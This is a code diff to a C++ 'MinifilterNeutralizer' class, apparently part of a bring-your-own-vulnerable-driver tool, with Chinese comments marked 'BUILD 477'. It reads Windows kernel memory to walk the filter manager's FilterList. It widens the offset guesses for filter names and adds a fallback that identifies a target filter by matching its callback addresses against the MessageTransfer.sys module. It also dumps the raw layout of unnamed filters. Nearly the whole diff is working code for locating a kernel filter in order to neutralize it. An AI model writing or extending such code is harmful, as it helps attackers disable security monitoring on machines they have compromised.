@@ -3410,8 +3410,18 @@ uint64_t MinifilterNeutralizer::FindFilterByName(uint64_t fltmgrBase, uint64_t f
 
     // 遍历 FilterList 链表
     // FLT_FILTER.ActiveLink 在 FLT_FILTER + 0x008
-    // Name.UNICODE_STRING 的偏移需要运行时检测 (尝试几个常见偏移)
-    uint64_t nameOffsets[] = { 0x188, 0x198, 0x1A8, 0x178 }; // Win10/11 变体
+    // Name.UNICODE_STRING 的偏移需要运行时检测
+    // ★ BUILD 477: Win11 FLT_FILTER 更大, 扩展到 0x38..0x300
+    uint64_t nameOffsets[] = {
+        0x038, 0x040, 0x048, 0x058, 0x068, 0x078,
+        0x088, 0x098, 0x0A8, 0x0B8, 0x0C8, 0x0D8,
+        0x0E8, 0x0F8, 0x108, 0x118, 0x128, 0x138,
+        0x148, 0x158, 0x168, 0x178, 0x188, 0x198,
+        0x1A8, 0x1B8, 0x1C8, 0x1D8, 0x1E8, 0x1F8,
+        0x208, 0x218, 0x228, 0x238, 0x248, 0x258,
+        0x268, 0x278, 0x288, 0x298, 0x2A8, 0x2B8,
+        0x2C8, 0x2D8, 0x2E8, 0x2F8, 0x300,
+    };
 
     uint64_t current = 0;
     if (!kma.ReadKernelVA(filterListHead, &current, sizeof(current)))
@@ -3449,6 +3459,93 @@ uint64_t MinifilterNeutralizer::FindFilterByName(uint64_t fltmgrBase, uint64_t f
     }
 
     ByovdDiag("FLT:NTRL: filter '%ls' not found in FilterList\n", name);
+
+    // ★ BUILD 477: 名称匹配失败 → fallback: 通过回调地址范围匹配
+    //   遍历 FilterList, 对每个 FLT_FILTER 读取 Operations 中的回调地址,
+    //   检查是否有回调落在目标驱动模块范围内
+    //   优点: 不依赖 Name 偏移, 适用于 Win10/11 所有 FLT_FILTER 布局版本
+    ByovdDiag("FLT:NTRL: falling back to callback-address-range matching (BUILD 477)...\n");
+
+    // 获取 MessageTransfer.sys 基址和大小
+    uint64_t mtBase = kma.GetKernelModuleBase("MessageTransfer.sys");
+    uint64_t mtSize = 0;
+    if (mtBase) {
+        // 读 PE 头获取 SizeOfImage
+        IMAGE_DOS_HEADER mtdos = {};
+        if (kma.ReadKernelVA(mtBase, &mtdos, sizeof(mtdos)) && mtdos.e_magic == IMAGE_DOS_SIGNATURE) {
+            IMAGE_NT_HEADERS64 mtnt = {};
+            uint64_t mtNtHdr = mtBase + mtdos.e_lfanew;
+            if (kma.ReadKernelVA(mtNtHdr, &mtnt, sizeof(mtnt)) && mtnt.Signature == IMAGE_NT_SIGNATURE) {
+                mtSize = mtnt.OptionalHeader.SizeOfImage;
+            }
+        }
+    }
+
+    if (!mtBase || !mtSize) {
+        ByovdDiag("FLT:NTRL: callback-range fallback SKIP — MessageTransfer.sys not loaded\n");
+        return 0;
+    }
+    ByovdDiag("FLT:NTRL: MessageTransfer.sys at 0x%llX size=0x%llX\n",
+        (unsigned long long)mtBase, (unsigned long long)mtSize);
+
+    // 重新遍历 FilterList, 通过回调地址匹配
+    if (!kma.ReadKernelVA(filterListHead, &current, sizeof(current))) return 0;
+
+    // Operations 指针偏移 — BUILD 477 扩展到更大范围
+    uint64_t opsOffsets[] = {
+        0x228, 0x238, 0x248, 0x258, 0x268, 0x278, 0x288, 0x298,
+        0x2A0, 0x2A8, 0x2B0, 0x2B8, 0x2C0, 0x2C8, 0x2D0, 0x2D8,
+        0x2E0, 0x2E8, 0x2F0, 0x2F8, 0x300,
+    };
+
+    for (int iter = 0; iter < 100 && current && current != filterListHead; iter++) {
+        uint64_t filterBase = current - 0x008;
+
+        // 尝试读取 Operations 指针
+        uint64_t opsAddr = 0;
+        uint64_t matchedOpsOff = 0;
+        for (uint64_t opsOff : opsOffsets) {
+            if (kma.ReadKernelVA(filterBase + opsOff, &opsAddr, sizeof(opsAddr))) {
+                if (opsAddr > 0xFFFF800000000000ULL) {
+                    matchedOpsOff = opsOff;
+                    break; // 找到可能的 Operations 指针
+                }
+            }
+        }
+
+        if (opsAddr > 0xFFFF800000000000ULL) {
+            // 读取 Operations 首条记录的地址 (FLT_OPERATION_REGISTRATION 数组)
+            // Operations 是一个指针, 指向 FLT_OPERATION_REGISTRATION 数组
+            uint64_t regArray = 0;
+            if (kma.ReadKernelVA(opsAddr, &regArray, sizeof(regArray))) {
+                // regArray 可能是 FLT_OPERATION_REGISTRATION 数组的地址
+                // 检查前 8 个条目的回调是否在 MessageTransfer 模块范围内
+                for (int ri = 0; ri < 8; ri++) {
+                    // FLT_OPERATION_REGISTRATION:
+                    //   +0x00: MajorFunction (1 byte)
+                    //   +0x04: Flags (4 bytes)
+                    //   +0x08: PreOperation (8 bytes)
+                    //   +0x10: PostOperation (8 bytes)
+                    uint64_t preOp = 0, postOp = 0;
+                    kma.ReadKernelVA(regArray + ri * 0x18 + 0x08, &preOp, sizeof(preOp));
+                    kma.ReadKernelVA(regArray + ri * 0x18 + 0x10, &postOp, sizeof(postOp));
+
+                    if ((preOp >= mtBase && preOp < mtBase + mtSize) ||
+                        (postOp >= mtBase && postOp < mtBase + mtSize)) {
+                        ByovdDiag("FLT:NTRL: callback-range MATCH! filter at 0x%llX (opsOff=0x%llX, preOp=0x%llX postOp=0x%llX)\n",
+                            (unsigned long long)filterBase, matchedOpsOff,
+                            (unsigned long long)preOp, (unsigned long long)postOp);
+                        return filterBase;
+                    }
+                }
+            }
+        }
+
+        if (!kma.ReadKernelVA(current, &current, sizeof(current)))
+            break;
+    }
+
+    ByovdDiag("FLT:NTRL: callback-range fallback also failed\n");
     return 0;
 }
 
@@ -3724,9 +3821,19 @@ bool MinifilterNeutralizer::VerifyFltPipeline() {
     // === Check 4: Enumerate filters in FilterList ===
     ByovdDiag("FLT:VERIFY: [4/%d] Enumerating filters in FilterList...\n", checksTotal);
 
-    uint64_t nameOffsets[] = { 0x188, 0x198, 0x1A8, 0x178 };
+    uint64_t nameOffsets[] = {
+        0x038, 0x040, 0x048, 0x058, 0x068, 0x078,
+        0x088, 0x098, 0x0A8, 0x0B8, 0x0C8, 0x0D8,
+        0x0E8, 0x0F8, 0x108, 0x118, 0x128, 0x138,
+        0x148, 0x158, 0x168, 0x178, 0x188, 0x198,
+        0x1A8, 0x1B8, 0x1C8, 0x1D8, 0x1E8, 0x1F8,
+        0x208, 0x218, 0x228, 0x238, 0x248, 0x258,
+        0x268, 0x278, 0x288, 0x298, 0x2A8, 0x2B8,
+        0x2C8, 0x2D8, 0x2E8, 0x2F8, 0x300,
+    };
 
     int filterCount = 0;
+    bool anyNamed = false;
     uint64_t current = 0;
     if (kma.ReadKernelVA(filterListHead, &current, sizeof(current))) {
         for (int iter = 0; iter < 100 && current && current != filterListHead; iter++) {
@@ -3756,8 +3863,18 @@ bool MinifilterNeutralizer::VerifyFltPipeline() {
             }
 
             if (!found) {
-                ByovdDiag("FLT:VERIFY:   [%d] (unnamed) at 0x%llX\n",
+                // ★ BUILD 477: dump unnamed filter 前 16 qword 诊断 Win11 FLT_FILTER 布局
+                ByovdDiag("FLT:VERIFY:   [%d] (unnamed) at 0x%llX — dump:\n",
                     filterCount, (unsigned long long)filterBase);
+                for (int q = 0; q < 16; q++) {
+                    uint64_t qw = 0;
+                    uint64_t dumpAddr = filterBase + q * 8;
+                    kma.ReadKernelVA(dumpAddr, &qw, sizeof(qw));
+                    if (q % 4 == 0) ByovdDiag("FLT:VERIFY:     +0x%03llX:", (unsigned long long)(q * 8));
+                    ByovdDiag(" %016llX", (unsigned long long)qw);
+                    if (q % 4 == 3) ByovdDiag("\n");
+                }
+                if (16 % 4 != 0) ByovdDiag("\n");
                 filterCount++;
             }
 
